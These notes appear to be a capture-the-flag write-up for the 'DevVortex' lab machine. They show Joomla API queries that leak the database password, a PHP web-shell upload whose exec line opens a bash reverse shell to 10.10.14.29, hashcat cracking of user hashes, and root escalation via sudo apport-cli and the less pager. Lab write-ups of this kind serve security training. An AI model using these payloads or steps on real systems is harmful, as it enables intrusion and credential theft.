# DevVortex

Found another subdomain called `dev.devvortex.htb`. This is a php site.

# 2023-11-26 12:04

When accessing any file ending in `.php` i get a _"file not found"_ response
instead of the default 404 page. This might be interesting for some fuzzing.

```
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ.php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.git/logs/              [Status: 403, Size: 3653, Words: 792, Lines: 70]
configuration           [Status: 200, Size: 0, Words: 1, Lines: 1]
index                   [Status: 200, Size: 23221, Words: 5081, Lines: 502]
```

# 2023-11-26 12:27

It seems all files ending in `php` (dot doesn't matter) are resolved to a file
(at least tried to resolve). Maybe try checking path traversal and ways to skip
the file extension check. Also this might be done directly via a system command
so check escaping those too.

- It follows paths (tested with `curl
  'dev.devvortex.htb/media/../configuration.php'`)

# 2023-11-26 13:44

After spending way to much time with trying to get a file bypass working for the
`php` part i decided to do another dir scan for devvortex. This resulted in
multiple hits including `/administrator`. This seems to be a Joomla page.

# 2023-11-26 14:06

Joomla has some open endpoints. This gives us the following:

```bash
$ curl 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq                14:04:44
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   697    0   697    0     0    557      0 --:--:--  0:00:01 --:--:--   557
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
  },
  "data": [
    {
      "type": "users",
      "id": "649",
      "attributes": {
        "id": 649,
        "name": "lewis",
        "username": "lewis",
        "email": "lewis@devvortex.htb",
        "block": 0,
        "sendEmail": 1,
        "registerDate": "2023-09-25 16:44:24",
        "lastvisitDate": "2023-11-26 12:57:50",
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Super Users"
      }
    },
    {
      "type": "users",
      "id": "650",
      "attributes": {
        "id": 650,
        "name": "logan paul",
        "username": "logan",
        "email": "logan@devvortex.htb",
        "block": 0,
        "sendEmail": 0,
        "registerDate": "2023-09-26 19:15:42",
        "lastvisitDate": null,
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Registered"
      }
    }
  ],
  "meta": {
    "total-pages": 1
  }
}
```

And more importantly 

```bash
curl 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq   14:04:48
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2010    0  2010    0     0   1791      0 --:--:--  0:00:01 --:--:--  1793
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true",
    "next": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "display_offline_message": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_image": "",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "sitename": "Development",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "editor": "tinymce",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "captcha": "0",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "list_limit": 20,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "access": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang_const": true,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "sd4fg_",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbencryption": 0,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbsslverifyservercert": false,
        "id": 224
      }
    }
  ],
  "meta": {
    "total-pages": 4
  }
}
```

Login in with `lewis:P4ntherg0t1n5r3c0n##` gives us access to the main page.

# 2023-11-26 14:15

In the templates folder we can add our own custom php files which we can then
call. Uploading the following file to the template:

```php
// ffff.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.29/9001 0>&1'"); ?>
```

Then calling `http://dev.devvortex.htb/templates/cassiopeia/ffff.php` and we got a shell.

# 2023-11-26 14:35

Using the data from the `configuration.php` we can also login to the database.
There we find two users:

```
lewis@devvortex.htb:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan@devvortex.htb:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

Running hashcat we find the pass for the logan user: `tequieromucho`. This is
also the pass for SSH.

# 2023-11-26 14:44

The logan user may run `/usr/bin/apport-cli` as root. This looks like a good way to get privesc.

# 2023-11-26 14:59

Creating a random crash file and then executing `sudo /usr/bin/apport-cli -c
c.crash` gave us an interface, selecting _"View report"_ eventually dropped us
in a `less pager`. From the pager we can call `!/bin/bash` and we have a root
shell.
